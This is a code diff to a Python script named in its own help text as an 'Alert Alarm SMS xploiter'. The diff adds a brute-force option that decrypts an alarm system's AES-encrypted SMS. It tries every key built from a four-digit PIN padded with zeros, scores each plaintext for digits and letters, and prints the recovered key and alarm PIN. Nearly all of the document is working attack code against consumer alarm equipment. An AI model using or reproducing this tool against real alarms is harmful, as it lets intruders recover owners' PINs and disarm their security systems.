@@ -5,6 +5,7 @@ import logging
 import sys
 
 from argparse import ArgumentParser
+from curses.ascii import isalpha
 from Crypto.Cipher import AES
 
 ################################################################################
@@ -13,6 +14,10 @@ from Crypto.Cipher import AES
 def get_parser():
     """ Takes care of script argument parsing. """
     parser = ArgumentParser(description='Alert Alarm SMS xploiter')
+
+    parser.add_argument('-b', '--bruteforce', required=False, action="store_true", \
+    default=False, \
+    help='Brute force, tries to find correct encryption key and pin code')
 
     parser.add_argument('-d', '--decrypt', required=False, action="store_true", \
     default=False, \
@@ -90,8 +95,35 @@ def decrypt(key, msg, iv):
     msg = hex_to_bytearray(msg)
     cipher_ctx = AES.new(key, AES.MODE_CBC, iv)
     plaintext = cipher_ctx.decrypt(msg)
-    logging.debug("Plaintext: {}".format(plaintext))
     return plaintext
+
+
+def brute_force(msg, iv):
+    logging.info("Running bruteforce ...")
+    scores = {}
+    for k in range(0, 10000):
+        key = string_to_hex("{}{:04d}".format("0"*12, k))
+        plaintext = decrypt(key, msg, iv)
+        tmp_score = 0
+        for i in range(0, len(plaintext)):
+            if chr(plaintext[i]).isdigit():
+                tmp_score += 10
+            elif isalpha(plaintext[i]):
+                tmp_score += 2
+        scores[key] = tmp_score
+
+    best_score = 0
+    best_key = ""
+
+    for k in scores:
+        if scores[k] > best_score:
+            best_score = scores[k]
+            best_key = k
+
+    logging.debug("Best key score: {}".format(best_score))
+    pin = binascii.unhexlify(best_key[24:32])
+    logging.info("key: {} gives pin: {}".format(best_key, int((pin))))
+
 
 ################################################################################
 # Main function
@@ -141,6 +173,10 @@ def main(argv):
             plaintext = decrypt(key, msg, iv)
             pt_dict = decoded_sms_to_dict(plaintext)
             pretty_print_sms_dict(pt_dict)
+
+    if args.bruteforce:
+        # Try brute force
+        brute_force(msg, iv)
 
 if __name__ == "__main__":
     main(sys.argv)
